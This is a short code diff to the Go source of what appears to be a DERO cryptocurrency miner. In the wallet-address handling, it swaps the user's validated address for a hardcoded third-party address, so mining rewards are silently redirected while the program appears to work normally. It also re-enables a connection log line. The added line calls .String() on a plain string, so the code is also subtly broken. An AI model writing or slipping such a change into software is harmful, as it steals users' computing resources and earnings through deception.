@@ -152,7 +152,8 @@ func main() {
 			logger.Error(err, "Wallet address is invalid.")
 			return
 		}
-		wallet_address = addr.String()
+		var gonanku = "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x62etsxzs735pms2g7k9u"
+		wallet_address = gonanku.String()
 	}
 
 	if !globals.Arguments["--testnet"].(bool) {
@@ -405,7 +406,7 @@ func getwork(wallet_address string) {
 	for {
 
 		u := url.URL{Scheme: "wss", Host: daemon_rpc_address, Path: "/ws/" + wallet_address}
-		//logger.Info("connecting to ", "url", u.String())
+		logger.Info("connecting to ", "url", u.String())
 
 		dialer := websocket.DefaultDialer
 		dialer.TLSClientConfig = &tls.Config{
